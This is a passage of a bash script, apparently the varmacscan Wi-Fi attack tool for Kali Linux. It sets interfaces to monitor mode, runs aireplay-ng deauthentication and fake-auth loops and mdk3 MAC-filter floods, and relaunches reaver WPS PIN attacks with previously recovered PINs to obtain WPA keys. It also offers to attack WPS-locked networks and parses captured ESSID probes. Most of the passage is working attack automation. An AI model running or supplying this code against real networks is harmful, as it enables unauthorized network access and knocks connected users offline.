     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xr8180" ] || [ x"`iwpriv $iface 2>/dev/null | grep debugtx`" != "x" ]
 then
     printf "$iface\t\tRTL8180/RTL8185\tr8180"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt8180,$iface,Realtek" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep prismhdr`" != "x" ]
         then
            iwpriv $iface prismhdr 1 >/dev/null 2>&1
         fi
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xr8187" ] || [ x"`iwpriv $iface 2>/dev/null | grep badcrc`" != "x" ]
 then
     printf "$iface\t\tRTL8187\t\tr8187"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt8180,$iface,Realtek" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep rawtx`" != "x" ]
         then
             iwpriv $iface rawtx 1 >/dev/null 2>&1
         fi
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xzd1211rw" ] || [ x"`iwpriv $iface 2>/dev/null | grep get_regdomain`" != "x" ]
 then
     printf "$iface\t\tZyDAS 1211\tzd1211rw"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=zd1211,$iface,ZyDAS" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xzd1211" ] || [ x"`iwpriv $iface 2>/dev/null | grep dbg_flag`" != "x" ]
 then
     printf "$iface\t\tZyDAS 1211\tzd1211"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=zd1211,$iface,ZyDAS" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xacx" ] || [ x"`iwpriv $iface 2>/dev/null | grep GetAcx1`" != "x" ]
 then
     printf "$iface\t\tTI ACX1xx\tacx"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=acx100,$iface,TI" >>$KISMET
         iwpriv $iface monitor 2 $CH 2> /dev/null >/dev/null
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xbcm43xx" ] || [ x"`iwpriv $iface 2>/dev/null | grep write_sprom`" != "x" ]
 then
     printf "$iface\t\tBroadcom\tbcm43xx"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=bcm43xx,$iface,broadcom" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
         ifconfig $iface up
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xislsm" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_announcedpkt`" != "x" ]
 then
    printf "$iface\t\tPrismGT\t\tislsm"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xat76c503a" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_announcedpkt`" != "x" ]
  then
     printf "$iface\t\tAtmel\t\tat76c503a"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
          startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
      then
      	 stopStdIface $iface
     fi     
     echo
     continue

 fi


 if [ x$DRIVER = "xndiswrapper" ] || [ x"`iwpriv $iface 2>/dev/null | grep ndis_reset`" != "x" ]
 then
     printf "$iface\t\tUnknown\t\tndiswrapper"
     if [ x$2 = x$iface ]
     then
         echo " (MONITOR MODE NOT SUPPORTED)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER != "x" ]
 then
     if [ x$CHIPSET = "x" ]
     then
         printf "$iface\t\tUNKNOWN\t\t$DRIVER"
     else
         printf "$iface\t\t$CHIPSET\t\t$DRIVER"
     fi

     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi

printf "$iface\t\tUnknown\t\tUnknown (MONITOR MODE NOT SUPPORTED)\n"

done

echo

if [ $UDEV_ISSUE != 0 ] ; then
	echo udev renamed the interface. Read the following for a solution:
	echo http://www.aircrack-ng.org/doku.php?id=airmon-ng#interface_athx_number_rising_ath0_ath1_ath2...._ath45
	echo 
fi

}

#~~~~~~~~~~~~~~~~~end  airmon-ng old end ~~~~~~~~~~~~~~~~~~~~# 

AIRACT_fn()

{

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]] && [[ $FAKEAUTH == y || $FAKEAUTH == Y ]]; then

		if [[ $FAKETYPE == 1 ]]; then

xterm -g 80x10-1+400 -T "Aireplay-ng Providing Reaver Association" -e "while true; do aireplay-ng -1 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; done" &

			fi

		if [[ $FAKETYPE == 2 ]]; then

xterm -g 80x10-1+400 -T "Aireplay-ng Providing Reaver Association" -e "while true; do aireplay-ng -0 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; aireplay-ng -1 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; done" &

			fi

		if [[ $FAKETYPE == 3 ]]; then

xterm -g 80x10-1+400 -T "Aireplay-ng Providing Reaver Association" -e "while true; do aireplay-ng -0 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; timeout $STOPAIR aireplay-ng -1 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; done" &

			fi

		if [[ $MACFIL == y || $MACFIL == Y ]]; then

xterm -g 80x10+0+0 -T "AP Activation mdk3 f" -e "while true; do mdk3 $monitor f -t $bssid; sleep 2; killall -q mdk3; mdk3 $monitor f -f 00:11:22:33:44:55 -t $bssid; sleep 2; killall -q mdk3; mdk3 $monitor f -f 00:11:22:33:44:77 -t $bssid; sleep 2; killall -q mdk3;  done" &

			fi

				fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]] && [[ $FAKEAUTH == y || $FAKEAUTH == Y ]]; then

		if [[ $FAKETYPE == 1 ]]; then

xterm -g 80x10-1+400 -T "Regenerative Aireplay-ng AP Activation" -e "while true; do aireplay-ng -1 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; done" &

			fi

		if [[ $FAKETYPE == 2 ]]; then

xterm -g 80x10-1+400 -T "Regenerative Aireplay-ng AP Activation" -e "while true; do aireplay-ng -0 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; aireplay-ng -1 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; done" &

			fi

		if [[ $FAKETYPE == 3 ]]; then

xterm -g 80x10-1+400 -T "Regenerative Aireplay-ng AP Activation" -e "while true; do aireplay-ng -0 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; timeout $STOPAIR aireplay-ng -1 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; done" &

			fi

		if [[ $MACFIL == y || $MACFIL == Y ]]; then

xterm -g 80x50+0-0 -T "AP Activation mdk3 f" -e "while true; do mdk3 $monitor f -t $bssid; sleep 2; killall -q mdk3; mdk3 $monitor f -f 00:11:22:33:44:55 -t $bssid; sleep 2; killall -q mdk3; mdk3 $monitor f -f 00:11:22:33:44:77 -t $bssid; sleep 2; killall -q mdk3;  done" &

			fi

				fi

}

#~~~~~~~~~~~~~~~~Start CHKPINFILE__fn() Start~~~~~~~~~~~~~~~~#

#Check for pin found but no WPA key
# This function looks for existance of WPS pin found in previous attacks versus bssid.

CHKPINFILE_fn()

{

	if [[ $WPSPIN == 12345670 ]]; then

			NUL70=1   

			fi

	if [[ $WPSPIN == 00000000 ]]; then

			NUL00=1   

			fi

	if [[ $PREVPIN == y || $PREVPIN == Y ]]; then

echo -e "[+] Looking for previous WPS pins found"

sleep 3

#Write list of files in folder

ls -1 /root/VARMAC_WPSWPA/ | cat > /tmp/wpslist1.txt 2> /dev/null

sleep 2 #give time for completion
# Strip out WPS pin for target bssid
 
cat < /tmp/wpslist1.txt | awk -v bssid="$bssid" '{FS="-"} ($1 == "PIN_FOUND" ) && ( substr($0, length($0) -16,length($0)) == bssid) { print $2}' | cat > /tmp/wpslist2.txt 

#Get PIN for bssid

#cat < /tmp/wpslist1.txt | awk 'BEGIN { FS="-" } ; { if($1 == "PIN_FOUND"); { print $0}}' | cat > /tmp/wpslist2.txt  

#print last 8 characters
#cat < /tmp/wpslist1.txt |   awk '{ print substr($0, length($0) -16,length($0) ) }'

# Possible more then one WPS might be found therefore in loop
# Make list of pins

sleep 2

WPSLST=$(cat < /tmp/wpslist2.txt | awk '{ print $1 }' | sed -e  's/^\(.\{8\}\).*$/\1/')

if [[ ! -z $WPSLST ]]; then

numberwps=$(echo -e "$WPSLST" | wc -l ) # get number of wps pins versus bssid 

# Correct bug in logic that provides 1 when variable is empty when wc -l used with variable

#	if [[ ! -z $WPSLST ]]; then

#		number1=$(echo -e "$WPSLST" | wc -l)

#		else

#		WPSLST=0

#		fi


sleep 1

numwps=$numberwps

WPSPIN=$(echo $WPSLST | awk '{ print $'$numwps' }')

#boolean out pin in default pins tests for 12345670 and 00000000

	if [[ $WPSPIN == 12345670 ]]; then

			NUL70=1   

			fi

	if [[ $WPSPIN == 00000000 ]]; then

			NUL00=1   

			fi

	until [[ $numwps -eq 0 ]]; do


sleep 1

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]]; then

xterm -g 80x15-1+1 -T "Test Pin $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]]; then

xterm -g 80x15-1+1 -T "Test Pin $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

sleep 1

AIRACT_fn
# sets airplay-ng/mdk3 activity

xterm -g 80x10-1+250 -T "Airodump-ng Scan 1" -e "airodump-ng -c $channel --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/singchan $monitor" &

echo -e "$txtrst"

echo -e "[+] Previous WPS pin $WPSPIN found for $bssid"
echo -e "[+] Loading WPS pin $WPSPIN into reaver"
echo -e "[+] Reattacking $ssid $bssid on channel $channel"
echo -e " "
echo -e "[+] Time before program restart"
seconds=$PREVTIME; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$yel    $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

echo -e "$txtrst"

PIDREV1=$(pgrep reaver)

kill -s SIGINT $PIDREV1
sleep 1
killall -q airodump-ng &>dev\null
sleep 1
killall -q aireplay-ng &>dev\null
sleep 1
killall -q xterm &>dev\null
sleep 1
killall -q pixiewps &>dev\null

echo -e "$txtrst"

PINFOUND_fn #looks for WPA key found

	if [[ $USE_PROBE == y ]] || [[ $USE_PROBE == Y ]] || [[ $USE_REF == y || $USE_REF == Y ]]; then

	echo -e "[+] Standby while all ESSID Probe Data from airodump-ng is processed...."

				fi

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then

			
			ESSIDPROBE_fn

				fi

	if [[ $USE_REF == y ]] || [[ $USE_REF == Y ]]; then

			ESSIDREF_fn

				fi

sleep 2

numwps=$(expr "$numwps" - 1) # loop number of numbwe of wps pins

WPSPIN=$(echo $WPSLST | awk '{ print $'$numwps' }')

		done

		fi

if [[ -z $WPSLST ]]; then

	echo -e "[+] No previous WPS pins found."
	sleep 3

	fi

#reattack with reaver if more then one pin

	fi

}

#~~~~~~~~~~~~~~~~End CHKPINFILE__fn() End~~~~~~~~~~~~~~~~#

#############airmonold use start

#~~~~~~~~~~~~~~~~Start USEAIR_OLD_fn Start~~~~~~~~~~~~~~~~#

USEAIR_OLD_fn()

{

AIROLDTEST=ZZZ

until [ $AIROLDTEST == y ] || [ $AIROLDTEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold                    Use Older Version of Airmon-ng$warn"
echo -e "                    $undr                              $norm"
echo ""                  
echo -e "$info     A method of using an older version of airmon-ng has been developed"
echo -e "$info  for users of Kali 2.0 and 2016R1R2."

echo -e "$info     If has been found that the older version of airmon-ng functions"
echo -e "$info  better with reaver in certain operations. If you find that reaver"
echo -e "$info  repeatedly gets the WPS pin but Not the WPA key you can switch to"
echo -e "$info  the older version of airmon-ng."
echo ""
echo -e "$inp     Enter$yel (y/Y)$inp to use a older version of airmon-ng."
echo -e "$inp  Select$yel (n/N)$inp to use the version of airmon-ng installed with Kali.$txtrst"	
	read AIROLD

	while true

	do

   echo ""
   echo -e  "$inp      You entered$yel $AIROLD$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read AIROLDTEST

	case $AIROLDTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done

}

#~~~~~~~~~~~~~~~~End airmonold End~~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~~Start CHECK_KILL_fn() Start~~~~~~~~~~~~~~~~#

CHECK_KILL_fn()

{

USECKILLTEST=ZZZ

until [ $USECKILLTEST == y ] || [ $USECKILLTEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold                    The Airmon-ng Check Kill Command$warn"
echo -e "                    $undr                                $norm"
echo ""                  
echo -e "$info     A method of$yel NOT$info employing the$yel airmon-ng check kill$info command has"
echo -e "$info  been developed for users of Kali 2.0 and 2016.R1R2. This allows the user to"
echo -e "$info  keep NetworkManager functioning on other devices not being used by"
echo -e "$info  varmacscan.  For this method to function, you must uncheck the$yel connect"
echo -e "$yel  automatically$info selection thru the Network Manager drop-down menus, for all"
echo -e "$info  ESSIDs selected for use with$yel $DEV$info, the device being used by varmacscan."
echo -e "$info  Stations setup on other devices DO NOT need to be altered. If Network-"
echo -e "$info  Manager has no ESSID to automatically connect to, then no disruption"
echo -e "$info  of varmacscan using $DEV will occur"
echo ""
echo -e "$info     If during the prescan process you get a$yel ioctl(SIOCGIFINDEX)...$info or"
echo -e "$info  a$yel [X] Error Failed open$info warning and wash and airdump-ng xterm windows"
echo -e "$info  remain blank, then shut-down the program, restart and select$yel (y/Y)$info to"
echo -e "$info  use this command."
echo -e "$info     If you do not need Network-Manager to function on other devices while"
echo -e "$info  varmacscan is running, then select$yel(y/Y)$info."
echo ""
echo -e "$inp     Enter$yel (y/Y)$inp to use the airmon-ng check kill command."
echo -e "$inp  Select$yel (n/N)$inp to not use the command.$txtrst"	
	read USECKILL

	while true

	do

   echo ""
   echo -e  "$inp      You entered$yel $USECKILL$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read USECKILLTEST

	case $USECKILLTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done

}

#~~~~~~~~~~~~~~~~End CHECK_KILL_fn() End~~~~~~~~~~~~~~~~#

KALI_TYPETEST=ZZZ
clear

IFCONFIG_TYPE_fn()
{
# Note text output for kali2016rolling has been altered
# Any routines requiring the use of text output must be altered
# Written as fn for portability into other MTeam prog.

iftype=$(ifconfig -a | grep -e wlan -e eth -e ath | awk '{if (($1 == "ether") || (substr($1,length($1),1) == ":")) {print "ether";exit;}}')

	if [[ $iftype == "ether" ]]; then

		ifselect=new

	else

		ifselect=old

		fi

}

KALI_TYPETEST=ZZZ
clear

KALI_L_fn()
{

until [ $KALI_TYPETEST == y ] || [ $KALI_TYPETEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold                    Kali-Linux Program In Use$warn"
echo -e "                    $undr                         $norm"
echo ""
echo ""
echo -e "$info     Select the Kali-Linux Program Being Used i.e. Kali 1, Kali 2"
echo -e "  or 2016.1 Rolling and higher."
echo ""
echo -e "$inp     Enter$yel (1)$inp if you are using Kali 1."
echo -e "$inp  Enter$yel (2)$inp if you are using Kali 2.$txtrst"
echo -e "$inp  Enter$yel (3)$inp if you are using 2016.1 Rolling or higher.$txtrst"
echo -e ""	
	read KALI_TYPE

	while true

	do

   echo ""
   echo -e  "$inp      You entered$yel $KALI_TYPE$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read KALI_TYPETEST

	case $KALI_TYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done


if  [[ $KALI_TYPE -ne 1 ]] && [[ $KALI_TYPE -ne 2 ]] && [[ $KALI_TYPE -ne 3 ]]; then

	echo ""
	echo ""
	echo -e  "$warn  !!!Enter$yel 1$warn,$yel 2$warn, or $yel 3$warn ONLY - try again!!!$txtrst"
	KALI_TYPETEST=ZZZ
	sleep 3
	KALI_L_fn

	fi

}





#~~~~~~~~~~~~~~Start Select to attack WPS locked routers Start~~~~~~~~~~~~~~#

WPSLOCKSEL_fn()

{

LOCK_SELTEST=ZZZ

until [ $LOCK_SELTEST == y ] || [ $LOCK_SELTEST == Y ]; do
clear
echo -e ""
echo -e "$q     Do you wish to attack WPS Locked Networks?" 
echo -e ""
echo -e "$inp     Select$yel (y/Y)$inp to attack ALL WPS enabled Networks"
echo -e "$inp  both locked and unlocked."
echo -e ""
echo -e "$inp  Enter$yel (n/N)$inp to attack ONLY Unlocked WPS enabled Networks.$txtrst"

read LOCK_SEL

while true

	do

echo ""
echo -e "$inp  You entered$yel $LOCK_SEL$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"

	read LOCK_SELTEST

	case $LOCK_SELTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

}

#~~~~~~~~~~~~~~End Select to attack WPS locked routers End~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~Start ESSIDPROBE_fn Start~~~~~~~~~~~~~~# 

ESSIDPROBE_fn()

{

# Copy files from folder used by handshake harvest

rm -f /tmp/ESSIDPROBE_DIR/*.kismet.csv

if [ ! -f  "/tmp/ESSIDPROBE_DIR/allcsv.txt" ]; then

	touch /tmp/ESSIDPROBE_DIR/allcsv.txt

	fi

countcsv1=`ls -1 /tmp/ESSIDPROBE_DIR/*.csv 2>/dev/null | wc -l`

if [[ $countcsv1 != 0 ]]; then

cat /tmp/ESSIDPROBE_DIR/*.csv >> /tmp/ESSIDPROBE_DIR/allcsv.txt

sleep 1

rm -f /tmp/ESSIDPROBE_DIR/*.csv

countcsv1=`ls -1 /tmp/ESSIDPROBE_DIR/allcsv.txt 2>/dev/null | wc -l`

	fi

sleep .1
#######################################################

# Sed commentary for MTeam prog
#sed 's/^[ \t]*//;s/[ \t]*$//' = Remove begin and end
#sed 's/.$//' = Convert to unix
#sed '/^$/d' remove blank lines
#sed 's/,/ /g' replace comma wih space

if [[ $KALI_TYPE == 1 ]]; then

cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk -F' ' '{ if((length($8) == 18 )) {$1=$2=$3=$4=$5=$6=$7=$8=""; print $0 }}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/hold01a.txt

		fi

if [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]] ; then

cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $0 }}' | sed 's/.$//;s/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/hold01a.txt

		fi

sleep .2

#Field 1
#echo -e "$txtrst[+] Writing ESSID probes Field 1"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 }' > /tmp/ESSIDPROBE_DIR/holdfield01a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 $2 }' > /tmp/ESSIDPROBE_DIR/holdfield01b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 $2 $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 " " $2 }' > /tmp/ESSIDPROBE_DIR/holdfield01d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 " " $2 " " $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01e.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 " " $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01f.txt

#Field 2
#echo "[+] Writing ESSID probes Field 2"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 }' > /tmp/ESSIDPROBE_DIR/holdfield02a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 $3 }' > /tmp/ESSIDPROBE_DIR/holdfield02b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 $3 $4 }' > /tmp/ESSIDPROBE_DIR/holdfield02c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 " " $3 " " $4 }' > /tmp/ESSIDPROBE_DIR/holdfield02e.txt

#Field 3
#echo "[+] Writing ESSID probes Field 3"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 }' > /tmp/ESSIDPROBE_DIR/holdfield03a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 $4 }' > /tmp/ESSIDPROBE_DIR/holdfield03b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 $4 $5 }' > /tmp/ESSIDPROBE_DIR/holdfield03c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 " " $4 }' > /tmp/ESSIDPROBE_DIR/holdfield03d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 " " $4 " " $5 }' > /tmp/ESSIDPROBE_DIR/holdfield03e.txt

#Field 4
#echo "[+] Writing ESSID probes Field 4"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 }' > /tmp/ESSIDPROBE_DIR/holdfield04a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 $5 }' > /tmp/ESSIDPROBE_DIR/holdfield04b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 $5 $6 }' > /tmp/ESSIDPROBE_DIR/holdfield04c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 " " $5 }' > /tmp/ESSIDPROBE_DIR/holdfield04d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 " " $5 " " $6 }' > /tmp/ESSIDPROBE_DIR/holdfield04e.txt

#Field 5
#echo "[+] Writing ESSID probes Field 5"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 }' > /tmp/ESSIDPROBE_DIR/holdfield05a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 $6 }' > /tmp/ESSIDPROBE_DIR/holdfield05b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 $6 $7 }' > /tmp/ESSIDPROBE_DIR/holdfield05c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 " " $6 }' > /tmp/ESSIDPROBE_DIR/holdfield05d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 " " $6 " " $7 }' > /tmp/ESSIDPROBE_DIR/holdfield05e.txt

#Field 6
#echo "[+] Writing ESSID probes Field 6"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 }' > /tmp/ESSIDPROBE_DIR/holdfield06a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 $7 }' > /tmp/ESSIDPROBE_DIR/holdfield06b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 $7 $8 }' > /tmp/ESSIDPROBE_DIR/holdfield06c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 " " $7 }' > /tmp/ESSIDPROBE_DIR/holdfield06d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 " " $7 " " $8 }' > /tmp/ESSIDPROBE_DIR/holdfield06e.txt

#Field 7
#echo "[+] Writing ESSID probes Field 7"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 }' > /tmp/ESSIDPROBE_DIR/holdfield07a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 $8 }' > /tmp/ESSIDPROBE_DIR/holdfield07b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 $8 $9 }' > /tmp/ESSIDPROBE_DIR/holdfield07c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 " " $8 }' > /tmp/ESSIDPROBE_DIR/holdfield07d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 " " $8 " " $9 }' > /tmp/ESSIDPROBE_DIR/holdfield07e.txt

#Field 8
#echo "[+] Writing ESSID probes Field 8"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 }' > /tmp/ESSIDPROBE_DIR/holdfield08a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 $9 }' > /tmp/ESSIDPROBE_DIR/holdfield08b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 $9 $10 }' > /tmp/ESSIDPROBE_DIR/holdfield08c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 " " $9 }' > /tmp/ESSIDPROBE_DIR/holdfield08d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 " " $9 " " $10 }' > /tmp/ESSIDPROBE_DIR/holdfield08e.txt

#Field 9
#echo "[+] Writing ESSID probes Field 9"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 }' > /tmp/ESSIDPROBE_DIR/holdfield09a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 $10 }' > /tmp/ESSIDPROBE_DIR/holdfield09b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 $10 $11 }' > /tmp/ESSIDPROBE_DIR/holdfield09c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 " " $10 }' > /tmp/ESSIDPROBE_DIR/holdfield09d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 " " $10 " " $11 }' > /tmp/ESSIDPROBE_DIR/holdfield09e.txt

#Field 10
#echo "[+] Writing ESSID probes Field 10"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 }' > /tmp/ESSIDPROBE_DIR/holdfield10a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 $11 }' > /tmp/ESSIDPROBE_DIR/holdfield10b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 $11 $12 }' > /tmp/ESSIDPROBE_DIR/holdfield10c.txt

